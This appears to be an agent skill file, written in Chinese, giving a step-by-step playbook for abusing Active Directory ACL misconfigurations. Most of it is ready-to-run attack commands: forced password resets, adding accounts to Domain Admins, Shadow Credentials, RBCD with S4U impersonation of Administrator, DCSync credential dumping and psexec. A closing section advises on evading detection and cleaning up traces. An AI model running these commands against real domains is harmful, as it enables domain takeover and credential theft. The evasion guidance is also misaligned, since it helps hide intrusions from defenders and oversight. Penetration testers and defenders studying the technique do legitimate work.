---
name: ad-acl-abuse
description: "Active Directory ACL 滥用攻击方法论。当 BloodHound 发现 GenericAll/WriteDACL/WriteOwner/GenericWrite/ForceChangePassword 等危险 ACE 时使用。覆盖 ACE 枚举、权限滥用链、Shadow Credentials、RBCD 攻击"
metadata:
  tags: "acl,dacl,ace,genericall,writedacl,writeowner,ad,bloodhound,权限滥用,ACL攻击,shadow credentials"
  category: "lateral"
  mitre_attack: "T1222.001,T1098,T1484"
---

# AD ACL 滥用攻击方法论

> **核心价值**：利用 AD 对象上的错误权限配置实现提权，无需漏洞利用

## ⛔ 深入参考

- ACE 权限位详解与完整滥用链 → [references/ace-abuse-chains.md](references/ace-abuse-chains.md)
- Shadow Credentials 与 RBCD 组合攻击 → [references/shadow-creds-rbcd.md](references/shadow-creds-rbcd.md)

---

## Phase 1: 危险 ACE 枚举

### 1.1 BloodHound 路径发现（首选）

```bash
# 数据收集
bloodhound-python -d DOMAIN -u user -p pass -dc DC_IP -c all

# BloodHound 中查询危险路径：
# - Shortest Path to Domain Admins
# - Find Principals with DCSync Rights
# - Find Dangerous Rights (ACL)
```

### 1.2 手动枚举（无 BloodHound 时）

```bash
# 使用 dacledit.py（impacket）
dacledit.py -dc-ip DC_IP DOMAIN/user:pass -target 'Domain Admins' -action read

# 使用 PowerView (Windows)
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite"}

# 使用 netexec
netexec ldap DC_IP -u user -p pass --dacl "CN=Domain Admins"
```

### 1.3 关键危险权限速查

| 权限 | 掩码 | 可做什么 |
|------|------|---------|
| GenericAll | 0x10000000 | 完全控制（改密码/修改属性/加入组） |
| GenericWrite | 0x40000000 | 写任意属性（SPN/脚本路径/msDS-KeyCredential） |
| WriteDACL | 0x00040000 | 修改权限（给自己加 GenericAll） |
| WriteOwner | 0x00080000 | 更改所有者（然后给自己加权限） |
| ForceChangePassword | ExtendedRight | 强制重置密码（无需知道原密码） |
| Self (Member) | 0x00000008 | 将自己加入组 |
| AllExtendedRights | 0x00000100 | DCSync / ForceChangePassword |

## Phase 2: 滥用决策树

```
发现什么权限？在什么对象上？
│
├─ GenericAll on User
│   ├─ 重置密码 → net rpc password -U user%pass -S DC_IP target_user 'NewP@ss'
│   ├─ Targeted Kerberoasting → 设置 SPN → 请求票据 → 破解
│   ├─ Shadow Credentials → 设置 msDS-KeyCredentialLink → 获取 TGT
│   └─ 修改 scriptPath → 下次登录执行恶意脚本
│
├─ GenericAll on Group
│   └─ 将自己加入组
│       net rpc group addmem "Domain Admins" user -U user%pass -S DC_IP
│
├─ GenericAll on Computer
│   ├─ RBCD → 设置 msDS-AllowedToActOnBehalfOfOtherIdentity
│   └─ Shadow Credentials → 设置 msDS-KeyCredentialLink
│
├─ WriteDACL on Object
│   └─ 先给自己加 GenericAll → 然后按上面操作
│       dacledit.py ... -target obj -action write -rights GenericAll -principal self
│
├─ WriteOwner on Object
│   └─ 先把自己设为 Owner → 然后 WriteDACL → GenericAll
│       owneredit.py ... -target obj -new-owner self
│
├─ GenericWrite on User
│   ├─ Targeted Kerberoasting → 设置 SPN
│   ├─ Shadow Credentials → 设置 Key Credential
│   └─ 修改 logon script
│
├─ ForceChangePassword on User
│   └─ 直接重置目标密码（⛔ 会锁定原用户）
│
└─ AllExtendedRights on Domain
    └─ DCSync → impacket-secretsdump DOMAIN/user:pass@DC_IP
```

## Phase 3: 常见利用命令

### 3.1 GenericAll → 重置密码

```bash
# impacket
net rpc password target_user 'N3wP@ss!' -U 'DOMAIN/user%pass' -S DC_IP

# rpcclient
rpcclient -U "user%pass" DC_IP -c "setuserinfo2 target_user 23 N3wP@ss!"

# PowerView
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString 'N3wP@ss!' -AsPlainText -Force)
```

### 3.2 GenericAll/GenericWrite → Shadow Credentials

```bash
# pywhisker — 添加 Key Credential
python3 pywhisker.py -d DOMAIN -u user -p pass --dc-ip DC_IP \
  -t target_user -a add

# 输出的 pfx 文件 → 使用 PKINITtools 获取 TGT
python3 gettgtpkinit.py -cert-pfx output.pfx -pfx-pass PASS \
  DOMAIN/target_user target_user.ccache

# 使用 TGT
export KRB5CCNAME=target_user.ccache
impacket-secretsdump -k -no-pass DOMAIN/target_user@DC_IP
```

### 3.3 GenericAll on Computer → RBCD

```bash
# 步骤 1: 添加或使用已控机器账户
impacket-addcomputer DOMAIN/user:pass -computer-name FAKE$ -computer-pass FakeP@ss

# 步骤 2: 设置目标机器的 msDS-AllowedToActOnBehalfOfOtherIdentity
rbcd.py -dc-ip DC_IP -delegate-to TARGET$ -delegate-from FAKE$ DOMAIN/user:pass
# 或使用 impacket
impacket-rbcd DOMAIN/user:pass -dc-ip DC_IP -target TARGET$ -delegate-from FAKE$ -action write

# 步骤 3: S4U2Self + S4U2Proxy 获取服务票据
impacket-getST -spn cifs/TARGET.DOMAIN -impersonate Administrator \
  DOMAIN/FAKE$:FakeP@ss -dc-ip DC_IP

# 步骤 4: 使用票据
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass TARGET.DOMAIN
```

### 3.4 WriteDACL → 先提权

```bash
# 给自己添加 GenericAll
dacledit.py -dc-ip DC_IP DOMAIN/user:pass \
  -target "CN=Target,DC=domain,DC=com" \
  -action write -rights GenericAll -principal user

# 然后按 GenericAll 的利用方式操作

# 清理：操作完后删除添加的 ACE
dacledit.py -dc-ip DC_IP DOMAIN/user:pass \
  -target "CN=Target,DC=domain,DC=com" \
  -action remove -rights GenericAll -principal user
```

### 3.5 WriteOwner → 接管所有权

```bash
# 修改对象所有者为自己
owneredit.py -dc-ip DC_IP DOMAIN/user:pass \
  -target "CN=Target,DC=domain,DC=com" \
  -new-owner user

# 所有者可以修改 DACL → 然后 WriteDACL → GenericAll
```

## Phase 4: OPSEC 注意事项

```
⛔ 高检测风险操作：
├─ 重置密码 → 用户报告无法登录 → 立即暴露
├─ 修改 Domain Admins 组成员 → 高优先级告警
├─ 修改 AdminSDHolder → 被 SDProp 还原 + 告警
└─ 大量 ACL 查询 → LDAP 审计日志

✓ 相对隐蔽操作：
├─ Shadow Credentials → 不改密码，不加组
├─ Targeted Kerberoasting → 只加 SPN，离线破解
├─ RBCD → 不直接修改敏感组
└─ 修改非特权用户 → 低告警

清理提醒：
├─ 删除添加的 SPN
├─ 删除添加的 Key Credential
├─ 删除 RBCD 委派配置
├─ 恢复修改的 ACE
└─ 删除创建的机器账户
```

## 工具速查

| 工具 | 用途 |
|------|------|
| BloodHound | ACL 路径可视化发现 |
| dacledit.py (impacket) | DACL 读取与修改 |
| owneredit.py | 修改对象所有者 |
| pywhisker | Shadow Credentials |
| rbcd.py / impacket-rbcd | RBCD 配置 |
| impacket-addcomputer | 添加机器账户 |
| PKINITtools | 证书→TGT |
| PowerView | Windows 端 ACL 操作 |

## 关联技能

- **AD 域攻击方法论** → `/skill:ad-domain-attack`
- **Kerberoasting** → `/skill:kerberoast-attack`
- **ADCS 证书攻击** → `/skill:adcs-certipy-attack`
- **NTLM 中继攻击** → `/skill:ntlm-relay-attack`
